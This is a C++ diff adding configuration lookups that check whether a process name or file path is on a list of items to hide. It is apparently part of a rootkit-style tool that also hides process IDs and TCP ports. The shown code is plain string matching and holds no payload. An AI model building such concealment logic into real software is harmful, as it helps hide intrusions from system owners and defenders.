@@ -35,6 +35,50 @@ bool Config::IsProcessIdHidden(DWORD processId)
 
 	return false;
 }
+bool Config::IsProcessNameHidden(LPCWSTR processName)
+{
+	if (Configuration && processName)
+	{
+		for (DWORD i = 0; i < Configuration->HiddenProcessNameCount; i++)
+		{
+			if (!lstrcmpiW(Configuration->HiddenProcessNames[i], processName))
+			{
+				return true;
+			}
+		}
+	}
+
+	return false;
+}
+bool Config::IsProcessNameHidden(UNICODE_STRING processName)
+{
+	PWCHAR chars = ConvertUnicodeStringToString(processName);
+	if (chars)
+	{
+		bool result = IsProcessNameHidden(chars);
+		delete[] chars;
+		return result;
+	}
+	else
+	{
+		return false;
+	}
+}
+bool Config::IsPathHidden(LPCWSTR path)
+{
+	if (Configuration && path)
+	{
+		for (DWORD i = 0; i < Configuration->HiddenPathCount; i++)
+		{
+			if (!lstrcmpiW(Configuration->HiddenPaths[i], path))
+			{
+				return true;
+			}
+		}
+	}
+
+	return false;
+}
 bool Config::IsTcpLocalPortHidden(USHORT port)
 {
 	if (Configuration)
